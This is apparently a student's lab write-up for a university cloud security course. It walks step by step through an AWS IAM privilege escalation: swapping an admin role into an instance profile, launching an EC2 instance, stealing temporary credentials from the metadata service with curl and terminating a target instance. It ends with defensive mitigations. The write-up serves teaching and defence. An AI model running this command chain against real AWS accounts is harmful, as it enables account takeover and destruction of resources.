# SOLUTION.md — IAM Privilege Escalation by Attachment
### CCGC 5501 — Cloud Security | Lab 2

---

## Table of Contents
1. [Challenge Summary](#challenge-summary)
2. [Environment Overview](#environment-overview)
3. [Attack Path Diagram](#attack-path-diagram)
4. [Step-by-Step Solution](#step-by-step-solution)
5. [Reflections](#reflections)

---

## Challenge Summary

This challenge simulates a real-world IAM privilege escalation attack in AWS. Starting as a low-privilege IAM user `kerrigan`, the objective is to escalate privileges by exploiting misconfigured IAM permissions to assume an administrator-level role, and use those elevated privileges to terminate the target EC2 instance `cg-super-critical-security-server`.

**Objective:** Terminate the target EC2 instance using escalated privileges obtained through IAM instance profile role substitution.

---

## Environment Overview

| Resource | Name | Value |
|---|---|---|
| IAM User | Attacker (Kerrigan) | `cg-kerrigan-iam_privesc_by_attachment-cgid7c11loyvlf` |
| IAM Role | Low Privilege | `cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf` |
| IAM Role | Admin (Target) | `cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf` |
| Instance Profile | Hijacked Profile | `cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf` |
| EC2 Instance | Target (Flag) | `cg-super-critical-security-server-iam_privesc_by_attachment-cgid7c11loyvlf` |
| Target Instance ID | To Terminate | `i-04cb792e4bbe5bfa2` |
| Attack Instance ID | Launched by Attacker | `i-0f174b827040a7e2e` |
| Subnet ID | Used for Launch | `subnet-0bf2f3e4275fe1cf3` |
| Security Group | Used for Launch | `sg-0e3f819675beeedce` |
| AWS Account | | `746486152766` |
| Region | | `us-east-1` |

### Kerrigan's Key Permissions (The Vulnerability Chain)
- `ec2:RunInstances` — can launch new EC2 instances
- `iam:ListInstanceProfiles` / `iam:ListRoles` — can enumerate IAM resources
- `iam:RemoveRoleFromInstanceProfile` — can detach roles from instance profiles
- `iam:AddRoleToInstanceProfile` — can attach roles to instance profiles
- `ec2:AssociateIamInstanceProfile` — can assign an instance profile to an EC2 instance
- `iam:PassRole` — scoped to both `meek` and `mighty` roles

---

## Attack Path Diagram

```
[kerrigan - low privilege IAM user]
        |
        | 1. Enumerate roles & instance profiles
        v
[Discover: meek profile + mighty (admin) role exist]
        |
        | 2. Remove 'meek' role from instance profile
        | 3. Add 'mighty' (admin) role to instance profile
        v
[Instance Profile now holds ADMIN role]
        |
        | 4. Launch new EC2 instance with the hijacked instance profile
        v
[New EC2 instance running AS mighty (admin)]
        |
        | 5. Query IMDS endpoint to steal temporary credentials
        |    http://169.254.169.254/latest/meta-data/iam/security-credentials/
        v
[Stolen: AccessKeyId + SecretAccessKey + SessionToken for 'mighty']
        |
        | 6. Configure AWS CLI locally with stolen credentials
        v
[Local shell now has FULL ADMIN access as mighty role]
        |
        | 7. Terminate the target EC2 instance
        v
[FLAG CAPTURED: cg-super-critical-security-server TERMINATED]
```

---

## Step-by-Step Solution

### Prerequisites
- Windows 11 with PowerShell in VSCode
- AWS CLI v2.34.51
- Terraform v1.15.4
- Git v2.53.0
- GitHub account for forking
- AWS IAM user with admin permissions for deployment (`dev-admin`)

---

### Phase 1 — Fork & Deploy the Infrastructure

**Step 1: Fork the repository on GitHub**

Navigate to:
`https://github.com/humbercloudsecurity/ccgc5501-cloud-security-challenge-iam_privesc_by_attachment`

Click **Fork** and fork it to your own GitHub account.

**Step 2: Clone your fork in VSCode**
```powershell
git clone https://github.com/YOUR_USERNAME/ccgc5501-cloud-security-challenge-iam_privesc_by_attachment.git
cd ccgc5501-cloud-security-challenge-iam_privesc_by_attachment
```

**Step 3: Configure Terraform variables**
```powershell
copy terraform.tfvars.example terraform.tfvars
```

Edit `terraform.tfvars` with the following values:
```hcl
profile      = "cloudgoat"
region       = "us-east-1"
cgid         = "cgid7c11loyvlf"
cg_whitelist = <REDACTED>
```

**Step 4: Create the cloudgoat AWS CLI profile**
```powershell
aws configure --profile cloudgoat
```

**Step 5: Initialize and deploy Terraform**
```powershell
terraform init
terraform plan
terraform apply
```

> 📸 **SCREENSHOT 1:** `terraform apply` completion output showing all outputs including
> `cloudgoat_output_kerrigan_access_key_id`, `instance_profile_name`, `meek_role_name`,
> `mighty_role_name`, and `target_instance_id`

Key outputs:
- cloudgoat_output_kerrigan_access_key_id = "AKIA********************"
- instance_profile_name = "cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf"
- meek_role_name = "cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf"
- mighty_role_name = "cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf"
- target_instance_id = "i-04cb792e4bbe5bfa2"
- target_instance_name = "cg-super-critical-security-server-iam_privesc_by_attachment-cgid7c11loyvlf"

Retrieve Kerrigan's secret key:
```powershell
terraform output cloudgoat_output_kerrigan_secret_key
```

---

### Phase 2 — Configure Attacker Credentials

**Step 6: Set up Kerrigan's AWS CLI profile**
```powershell
aws configure --profile kerrigan
# AWS Access Key ID:     AKIA********************
# AWS Secret Access Key: <REDACTED>
# Default region:        us-east-1
# Default output format: json
```

**Step 7: Verify Kerrigan's identity**
```powershell
aws sts get-caller-identity --profile kerrigan
```

> 📸 **SCREENSHOT 2:** Output of `aws sts get-caller-identity --profile kerrigan` confirming
> we are operating as the attacker user

Command: aws sts get-caller-identity --profile kerrigan

Output:
{
    "UserId": "AIDA23TQKXY7P6UHDVJ5W",
    "Account": "746486152766",
    "Arn": "arn:aws:iam::746486152766:user/cg-kerrigan-iam_privesc_by_attachment-cgid7c11loyvlf"
}

---

### Phase 3 — Reconnaissance

**Step 8: Enumerate IAM roles**
```powershell
aws iam list-roles --profile kerrigan `
  --query "Roles[?contains(RoleName,'cg-')].{Name:RoleName,ARN:Arn}" `
  --output table
```

Output revealed two roles:
- `cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf` (low privilege)
- `cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf` (admin)

**Step 9: Enumerate instance profiles**
```powershell
aws iam list-instance-profiles --profile kerrigan `
  --query "InstanceProfiles[?contains(InstanceProfileName,'cg-')].{Name:InstanceProfileName,Roles:Roles[*].RoleName}" `
  --output table
```

> 📸 **SCREENSHOT 3:** Output showing the instance profile currently holding the `meek` role
> (before the swap)

Reconnaissance — instance profile currently holds the low-privilege meek role.

Command: aws iam list-instance-profiles --profile kerrigan --output table

Shows:
- Profile: cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf
- Role:    cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf
---

### Phase 4 — Privilege Escalation (The Attack)

**Step 10: Remove the meek role from the instance profile**
```powershell
aws iam remove-role-from-instance-profile --profile kerrigan `
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf `
  --role-name cg-ec2-meek-role-iam_privesc_by_attachment-cgid7c11loyvlf
```

**Step 11: Add the mighty (admin) role to the instance profile**
```powershell
aws iam add-role-to-instance-profile --profile kerrigan `
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf `
  --role-name cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf
```

**Step 12: Verify the role swap**
```powershell
aws iam list-instance-profiles --profile kerrigan `
  --query "InstanceProfiles[?contains(InstanceProfileName,'cg-')].{Name:InstanceProfileName,Roles:Roles[*].RoleName}" `
  --output table
```

> 📸 **SCREENSHOT 4:** Output showing the instance profile now holding the `mighty` role
> (after the swap) — this confirms successful privilege escalation setup

Privilege escalation confirmed — instance profile now holds the admin mighty role.

Commands executed:
1. aws iam remove-role-from-instance-profile (removed meek role)
2. aws iam add-role-to-instance-profile (added mighty role)
3. aws iam list-instance-profiles --profile kerrigan --output table (verified)

Shows:
- Profile: cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf
- Role:    cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf

**Step 13: Create an SSH key pair**
```powershell
aws ec2 create-key-pair --profile kerrigan `
  --key-name kerrigan-attack-key2 `
  --query "KeyMaterial" `
  --output text | Out-File -Encoding ascii -FilePath kerrigan-attack-key2.pem
```

**Step 14: Launch the attack EC2 instance with the hijacked admin profile**
```powershell
aws ec2 run-instances --profile kerrigan `
  --image-id ami-0c02fb55956c7d316 `
  --instance-type t2.micro `
  --subnet-id subnet-0bf2f3e4275fe1cf3 `
  --security-group-ids sg-0e3f819675beeedce `
  --iam-instance-profile Name=cg-ec2-meek-instance-profile-iam_privesc_by_attachment-cgid7c11loyvlf `
  --associate-public-ip-address `
  --key-name kerrigan-attack-key2 `
  --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=kerrigan-attack-instance2}]" `
  --query "Instances[0].{InstanceId:InstanceId,State:State.Name}" `
  --output table
```

Attack instance launched: `i-0f174b827040a7e2e`

**Step 15: Wait for instance to be running and get public IP**
```powershell
aws ec2 describe-instances --profile kerrigan `
  --filters "Name=tag:Name,Values=kerrigan-attack-instance2" `
  --query "Reservations[0].Instances[0].{State:State.Name,PublicIP:PublicIpAddress,InstanceId:InstanceId}" `
  --output table
```

Attack instance public IP: `32.192.224.192`

---

### Phase 5 — Credential Theft via IMDS

**Step 16: SSH into the attack instance**
```powershell
ssh -i kerrigan-attack-key2.pem ec2-user@32.192.224.192
```

**Step 17: Query IMDS to confirm the mighty role is attached**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Output: `cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf`

**Step 18: Steal the temporary admin credentials**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf
```

> 📸 **SCREENSHOT 5:** SSH session showing the IMDS curl output returning the mighty role
> credentials (AccessKeyId, SecretAccessKey, Token)

SSH into attack instance (i-0f174b827040a7e2e) and querying the EC2 Instance 
Metadata Service (IMDS) to steal temporary admin credentials.

Commands:
ssh -i kerrigan-attack-key2.pem ec2-user@32.192.224.192
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf

Returned credentials:
- AccessKeyId:      ASIA********************
- SecretAccessKey: <REDACTED>
- Token:           <session token>
- Expiration:      2026-06-13T22:09:21Z

Exit the attack instance:
```bash
exit
```

---

### Phase 6 — Capture the Flag

**Step 19: Configure the mighty profile with stolen credentials**
```powershell
aws configure --profile mighty
# AWS Access Key ID:      ASIA********************
# AWS Secret Access Key: <REDACTED>
# Default region:        us-east-1
# Default output format: json
```

Set the session token:
```powershell
aws configure set aws_session_token "<TOKEN>" --profile mighty
```

**Step 20: Verify full admin access**
```powershell
aws sts get-caller-identity --profile mighty
```

Output confirmed:

> 📸 **SCREENSHOT 6:** Output of `aws sts get-caller-identity --profile mighty` confirming
> we are now operating as the mighty (admin) role

Full admin access confirmed — now operating as the mighty role using stolen 
temporary credentials from the IMDS.

Command: aws sts get-caller-identity --profile mighty

Output:
{
    "UserId": "AROA23TQKXY7IIAH7SLX6:i-0f174b827040a7e2e",
    "Account": "746486152766",
    "Arn": "arn:aws:sts::746486152766:assumed-role/cg-ec2-mighty-role-iam_privesc_by_attachment-cgid7c11loyvlf/i-0f174b827040a7e2e"
}

**Step 21: Terminate the target EC2 instance — FLAG CAPTURED** 🏁
```powershell
aws ec2 terminate-instances --profile mighty --instance-ids i-04cb792e4bbe5bfa2
```

**Step 22: Verify termination**
```powershell
aws ec2 describe-instances --profile mighty `
  --instance-ids i-04cb792e4bbe5bfa2 `
  --query "Reservations[0].Instances[0].{Name:Tags[?Key=='Name']|[0].Value,InstanceId:InstanceId,State:State.Name}" `
  --output table
```

> 📸 **SCREENSHOT 7:** Output showing the target instance in `terminated` state —
> this is the primary proof of challenge completion

FLAG CAPTURED — target EC2 instance successfully terminated using escalated 
admin privileges obtained through IAM instance profile role substitution.

Command: aws ec2 describe-instances --profile mighty --instance-ids i-04cb792e4bbe5bfa2

Output:
+------------+-------------------------------------------------------------------------------+
|  InstanceId|  i-04cb792e4bbe5bfa2                                                          |
|  Name      |  cg-super-critical-security-server-iam_privesc_by_attachment-cgid7c11loyvlf   |
|  State     |  terminated                                                                   |
+------------+-------------------------------------------------------------------------------+

---

### Phase 7 — Cleanup

```powershell
terraform destroy
```

Type `yes` when prompted. This removes all provisioned AWS resources.

---

## Reflections

### What This Attack Exploits
This scenario demonstrates IAM privilege escalation by instance profile role substitution. The root cause is not a single dangerous permission, it is the dangerous combination of permissions granted to `kerrigan`. Each permission (`PassRole`, `RunInstances`, `AddRoleToInstanceProfile`) appears justifiable in isolation, but together they form a complete privilege escalation chain that results in full AWS account compromise.

### Why This Is Dangerous in the Real World
In real AWS environments, permissions like `iam:PassRole` and `ec2:RunInstances` are commonly granted to developers and DevOps engineers for legitimate infrastructure work. Without careful scoping e.g. restricting `PassRole` to specific low-privilege roles, or requiring MFA conditions, these permissions can be used for infiltration exactly as demonstrated here. The attack requires no exploitation of software vulnerabilities, but it abuses legitimate AWS API calls, making it difficult to detect without dedicated CSPM tooling or CloudTrail alerting.

### The Role of the EC2 Metadata Service (IMDS)
The EC2 Instance Metadata Service is what makes this attack practical. Any process running on an EC2 instance can query `http://169.254.169.254/...` without any authentication to retrieve temporary credentials for the attached IAM role. AWS has addressed this partially with IMDSv2 which requires a token-based session, but many environments still use IMDSv1. This is why the principle of least privilege for IAM roles attached to EC2 is critical, those credentials are accessible to anything running on the machine, including malware.

### Key Defensive Mitigations
1. Restrict `iam:PassRole`** using `Condition` blocks to limit which roles can be passed and to which services.
2. Enforce IMDSv2 on all EC2 instances using `HttpTokens: required` to prevent unauthenticated IMDS access.
3. Never allow `iam:AddRoleToInstanceProfile`** to non-admin users without strict conditions.
4. Enable CloudTrail** and alert on `AddRoleToInstanceProfile`, `AssociateIamInstanceProfile`, and `RunInstances` events from non-privileged users.
5. Apply least privilege rigorously, evaluate IAM policies as a whole graph, not permission by permission.
6. Use AWS IAM Access Analyzer to detect overly permissive policies before they reach production.

### What I Learned
This challenge reinforced that cloud security misconfigurations are rarely about a single "big" mistake. they are about subtle combinations of permissions that individually seem harmless. Thinking like an attacker, mapping permission chains rather than evaluating permissions one at a time is an essential skill for both cloud architects and security reviewers. It also highlighted the importance of treating the IMDS as a sensitive credential endpoint and hardening it accordingly with IMDSv2 enforcement.

---


